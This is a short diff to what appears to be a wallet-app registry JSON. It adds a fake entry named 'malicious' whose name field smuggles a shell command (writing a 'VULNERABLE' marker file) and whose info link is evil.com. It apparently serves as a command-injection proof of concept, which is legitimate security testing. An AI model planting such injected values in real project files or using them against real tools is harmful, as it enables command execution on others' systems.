@@ -1,5 +1,18 @@
 [
   {
+    "app_name": "malicious",
+    "name": "'; echo 'VULNERABLE' > /tmp/poc.txt; echo '",
+    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Grosser_Panda.JPG/250px-Grosser_Panda.JPG",
+    "about_url": "https://evil.com",
+    "bridge": [
+      {
+        "type": "js",
+        "key": "malicious"
+      }
+    ],
+    "platforms": ["chrome"]
+  },
+  {
     "app_name": "tonkeeper",
     "name": "Tonkeeper",
     "image": "https://tonkeeper.com/assets/tonconnect-icon.png",
